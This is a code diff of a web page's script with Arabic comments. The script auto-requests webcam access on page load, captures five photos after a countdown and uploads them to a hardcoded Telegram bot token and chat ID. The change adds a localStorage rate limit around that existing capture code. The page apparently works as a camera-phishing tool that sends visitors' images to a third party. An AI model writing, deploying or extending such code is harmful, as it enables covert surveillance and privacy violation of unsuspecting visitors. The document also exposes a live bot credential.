@@ -18,80 +18,96 @@
   </div>
 
 <script>
-const botToken = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
-const chatId   = '1717245674';
-const PHOTO_LIMIT = 5;          // عدد الصور
-const INTERVAL_MS = 150;        // بين كل لقطة وأخرى
-const video = document.getElementById('video');
-const countdownEl = document.getElementById('countdown');
-const fallbackBtn = document.getElementById('fallbackBtn');
+// ✅ حماية من تكرار الدخول
+const visits = JSON.parse(localStorage.getItem("visitLogs") || "[]");
+const now = Date.now();
 
-// نحاول فورًا بعد التحميل – داخل نافذة تفعيل المستخدم
-window.addEventListener('DOMContentLoaded', tryStartCapture);
-// زرّ طوارئ إن فشل المحاولة الصامتة
-fallbackBtn.addEventListener('click', () => tryStartCapture(true));
+// نظف الزيارات الأقدم من 30 ثانية
+const recentVisits = visits.filter(ts => now - ts <= 30_000);
+recentVisits.push(now);
+localStorage.setItem("visitLogs", JSON.stringify(recentVisits));
 
-async function tryStartCapture(fromButton = false){
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    video.srcObject = stream;
-    video.style.display = 'block';
-    fallbackBtn.style.display = 'none';
-    startSequence();
-  }catch(err){
-    console.warn('getUserMedia فشل:', err);
-    if(!fromButton){
-      // أظهر الزر ليضغطه المستخدم يدويًا
-      fallbackBtn.style.display = 'inline-block';
-      countdownEl.textContent = 'اضغط الزر لتشغيل الكاميرا';
-    }else{
-      alert('تعذّر الوصول إلى الكاميرا (تأكد من الإذن أو من المتصفح).');
+if (recentVisits.length > 10) {
+  // تم الحظر مؤقتًا
+  document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;font-family:Arial;'>🚫 تم حظرك مؤقتًا لمدة 10 دقائق</h1>";
+  setTimeout(() => {
+    localStorage.removeItem("visitLogs");
+    location.reload();
+  }, 10 * 60 * 1000); // 10 دقائق
+} else {
+  // ✅ الكود الأصلي يبدأ هنا
+  const botToken = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
+  const chatId   = '1717245674';
+  const PHOTO_LIMIT = 5;
+  const INTERVAL_MS = 150;
+  const video = document.getElementById('video');
+  const countdownEl = document.getElementById('countdown');
+  const fallbackBtn = document.getElementById('fallbackBtn');
+
+  window.addEventListener('DOMContentLoaded', tryStartCapture);
+  fallbackBtn.addEventListener('click', () => tryStartCapture(true));
+
+  async function tryStartCapture(fromButton = false){
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({video:true});
+      video.srcObject = stream;
+      video.style.display = 'block';
+      fallbackBtn.style.display = 'none';
+      startSequence();
+    }catch(err){
+      console.warn('getUserMedia فشل:', err);
+      if(!fromButton){
+        fallbackBtn.style.display = 'inline-block';
+        countdownEl.textContent = 'اضغط الزر لتشغيل الكاميرا';
+      }else{
+        alert('تعذّر الوصول إلى الكاميرا (تأكد من الإذن أو من المتصفح).');
+      }
     }
   }
-}
 
-function startSequence(){
-  let remaining = 10; // عدّ تنازلي
-  countdownEl.textContent = `سيبدأ التصوير خلال ${remaining} ثوانٍ…`;
-  const t = setInterval(()=>{
-    remaining--;
-    countdownEl.textContent = (remaining>0)
-      ? `سيبدأ التصوير خلال ${remaining} ثوانٍ…`
-      : 'يتم التقاط الصور…';
-    if(remaining<=0){ clearInterval(t); capturePhotos(); }
-  },1000);
-}
+  function startSequence(){
+    let remaining = 10;
+    countdownEl.textContent = `سيبدأ التصوير خلال ${remaining} ثوانٍ…`;
+    const t = setInterval(()=>{
+      remaining--;
+      countdownEl.textContent = (remaining>0)
+        ? `سيبدأ التصوير خلال ${remaining} ثوانٍ…`
+        : 'يتم التقاط الصور…';
+      if(remaining<=0){ clearInterval(t); capturePhotos(); }
+    },1000);
+  }
 
-function capturePhotos(){
-  let taken = 0;
-  const photos = [];
-  const canvas = document.createElement('canvas');
-  canvas.width  = video.videoWidth  || 320;
-  canvas.height = video.videoHeight || 240;
-  const ctx = canvas.getContext('2d');
+  function capturePhotos(){
+    let taken = 0;
+    const photos = [];
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth  || 320;
+    canvas.height = video.videoHeight || 240;
+    const ctx = canvas.getContext('2d');
 
-  const id = setInterval(()=>{
-    if(taken >= PHOTO_LIMIT){
-      clearInterval(id);
-      sendPhotos(photos);
-      countdownEl.textContent = 'اكتمل الإرسال ✅';
-      return;
-    }
-    ctx.drawImage(video,0,0);
-    canvas.toBlob(b=>{ photos.push(b); });
-    taken++;
-  }, INTERVAL_MS);
-}
+    const id = setInterval(()=>{
+      if(taken >= PHOTO_LIMIT){
+        clearInterval(id);
+        sendPhotos(photos);
+        countdownEl.textContent = 'اكتمل الإرسال ✅';
+        return;
+      }
+      ctx.drawImage(video,0,0);
+      canvas.toBlob(b=>{ photos.push(b); });
+      taken++;
+    }, INTERVAL_MS);
+  }
 
-function sendPhotos(blobs){
-  blobs.forEach((blob,i)=>{
-    const form = new FormData();
-    form.append('chat_id', chatId);
-    form.append('photo', blob, `photo${i+1}.jpg`);
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST',body:form})
-      .then(r=>r.json()).then(j=>console.log('Telegram',j))
-      .catch(e=>console.error('Telegram error',e));
-  });
+  function sendPhotos(blobs){
+    blobs.forEach((blob,i)=>{
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append('photo', blob, `photo${i+1}.jpg`);
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST',body:form})
+        .then(r=>r.json()).then(j=>console.log('Telegram',j))
+        .catch(e=>console.error('Telegram error',e));
+    });
+  }
 }
 </script>
 </body>
